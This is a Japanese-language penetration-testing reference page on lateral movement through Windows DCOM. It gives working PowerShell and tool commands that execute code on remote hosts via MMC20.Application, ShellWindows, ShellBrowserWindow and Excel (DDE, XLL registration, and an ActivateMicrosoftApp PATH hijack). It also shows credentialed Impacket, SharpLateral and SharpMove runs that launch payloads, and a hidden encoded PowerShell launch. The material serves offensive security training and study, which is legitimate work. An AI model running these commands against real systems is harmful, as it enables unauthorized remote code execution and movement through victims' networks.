# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement が有用なのは、service や scheduled task を作成する代わりに、RPC/DCOM 経由で公開されている既存の COM server を再利用できるためです。実際には、最初の接続は通常 TCP/135 で開始され、その後、動的に割り当てられた高位の RPC port へ移行します。

## 前提条件と注意点

- 通常、target 上で local administrator context が必要であり、remote COM server が remote launch/activation を許可している必要があります。
- **2023 年 3 月 14 日以降**、Microsoft はサポート対象システムに対して DCOM hardening を適用しています。低い activation authentication level を要求する古い client は、少なくとも `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` 以上で negotiate できない場合、失敗することがあります。Modern Windows client は通常、自動的に引き上げられるため、現在の tooling は通常そのまま動作します。<sup>[[3]](#references)</sup>
- Manual または scripted DCOM execution には、通常 TCP/135 に加えて target の dynamic RPC port range が必要です。Impacket の `dcomexec.py` を使用して command output を取得したい場合、通常は `ADMIN$`（または書き込み・読み取り可能な別の share）への SMB access も必要です。
- RPC/DCOM は動作するものの SMB が block されている場合でも、`dcomexec.py -nooutput` は blind execution に使用できます。

簡単な確認:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**この technique の詳細については、[https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) の original post を参照してください。**<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) オブジェクトは、ネットワークベースでオブジェクトと相互作用するための興味深い機能を提供します。Microsoft は DCOM と Component Object Model (COM) の両方について包括的な documentation を提供しており、[DCOM の documentationはこちら](https://msdn.microsoft.com/en-us/library/cc226801.aspx)、[COM の documentationはこちら](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)からアクセスできます。PowerShell command を使用して DCOM applications の一覧を取得できます。
```bash
Get-CimInstance Win32_DCOMApplication
```
COM オブジェクトである [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) を使用すると、MMC snap-in の操作をスクリプト化できます。特に、このオブジェクトには `Document.ActiveView` の下に `ExecuteShellCommand` メソッドが含まれています。このメソッドの詳細については、[こちら](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)を参照してください。実行して確認します。

この機能により、DCOM application を介してネットワーク越しにコマンドを実行できます。管理者としてリモートから DCOM と対話するには、PowerShell を次のように使用できます。
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
このコマンドは DCOM application に接続し、COM object のインスタンスを返します。その後、ExecuteShellCommand method を呼び出して remote host 上で process を実行できます。process は次の手順で実行されます。

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCEを取得:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
最後の引数はウィンドウスタイルです。`7` にするとウィンドウは最小化されたままになります。運用上、MMCベースの実行では通常、リモートの `mmc.exe` プロセスが payload を起動するため、以下の Explorer ベースのオブジェクトとは異なります。

## ShellWindows & ShellBrowserWindow

**この technique の詳細については、元の投稿 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>**を参照してください。**

**MMC20.Application** object には明示的な「LaunchPermissions」がなく、Administrators に access を許可する permissions がデフォルトで適用されることが確認されました。詳細については[こちら](https://twitter.com/tiraniddo/status/817532039771525120)の thread を確認できます。また、明示的な Launch Permission がない objects を filter するには、[@tiraniddo](https://twitter.com/tiraniddo) の OleView .NET の使用が推奨されます。

`ShellBrowserWindow` と `ShellWindows` という2つの特定の objects は、明示的な Launch Permissions がないため注目されました。`HKCR:\AppID\{guid}` 配下に `LaunchPermission` registry entry が存在しないことは、明示的な permissions がないことを意味します。

`MMC20.Application` と比較すると、これらの objects は、command が `mmc.exe` ではなくリモート host 上の `explorer.exe` の child として実行されることが多いため、OPSEC の観点ではより静かです。

### ShellWindows

ProgID を持たない `ShellWindows` では、.NET methods の `Type.GetTypeFromCLSID` と `Activator.CreateInstance` により、AppID を使用して object を instantiate できます。この process では OleView .NET を使用して `ShellWindows` の CLSID を取得します。instantiate 後は `WindowsShell.Item` method を通じて interaction でき、`Document.Application.ShellExecute` のような method invocation につながります。

object を instantiate してリモートで commands を実行する PowerShell commands の例が提供されています。
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` も似ていますが、その CLSID を介して直接インスタンス化し、`Document.Application.ShellExecute` へ pivot できます:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objectsを利用したLateral Movement

DCOM Excel objectsを悪用することで、Lateral Movementを実現できます。詳細については、[Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)の、DCOM経由のLateral MovementにExcel DDEを利用する方法に関する解説を読むことを推奨します。<sup>[[5]](#references)</sup>

Empire projectには、DCOM objectsを操作してExcelをremote code execution (RCE)に利用する方法を示したPowerShell scriptが用意されています。以下は、[Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)で公開されているscriptから抜粋したもので、ExcelをRCEに悪用するさまざまな方法を紹介しています：
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
最近の研究では、`Excel.Application` の `ActivateMicrosoftApp()` メソッドによって、この領域がさらに拡張されました。重要な点は、Excel がシステムの `PATH` を検索して、FoxPro、Schedule Plus、Project などの legacy Microsoft applications の起動を試みることです。operator が、想定される名前の payload を target の `PATH` に含まれる writable location に配置できれば、Excel がそれを実行します。<sup>[[4]](#references)</sup>

この variation の要件:

- target の Local admin
- target に Excel がインストールされていること
- target の `PATH` に含まれる writable directory に payload を書き込めること

FoxPro lookup（`FOXPROW.exe`）を悪用する実践例:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
攻撃ホストにローカルの `Excel.Application` ProgID が登録されていない場合は、代わりに CLSID を使用してリモートオブジェクトをインスタンス化します：
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
実際に悪用されている値:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Lateral Movement用のAutomation Tools

これらのtechniqueを自動化するため、次の2つのtoolが紹介されています:

- **Invoke-DCOM.ps1**: Empire projectが提供するPowerShell scriptで、remote machines上でcodeを実行するためのさまざまなmethodのinvocationを簡略化します。このscriptはEmpire GitHub repositoryから利用できます。

- **SharpLateral**: remoteでcodeを実行するために設計されたtoolで、次のcommandで使用できます:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## 自動ツール

- Powershell スクリプト [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) を使用すると、他のマシン上で code を実行するための、コメントで説明されているすべての方法を簡単に invoke できます。
- Impacket の `dcomexec.py` を使用すると、DCOM 経由でリモートシステム上のコマンドを実行できます。現在の build は `ShellWindows`、`ShellBrowserWindow`、`MMC20` をサポートしており、デフォルトは `ShellWindows` です。
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- [**SharpLateral**](https://github.com/mertdas/SharpLateral) も使用できます：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [**SharpMove**](https://github.com/0xthirteen/SharpMove) も使用できます
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## 参考資料

- [1] [MMC20.Application COM Objectを使用したLateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [DCOM経由のLateral Movement: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass（CVE-2021-26414）の変更を管理する](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: DCOM Excel ApplicationのPowerを悪用する](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM経由のLateral MovementにExcel DDEを活用する](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)

{{#include ../../banners/hacktricks-training.md}}
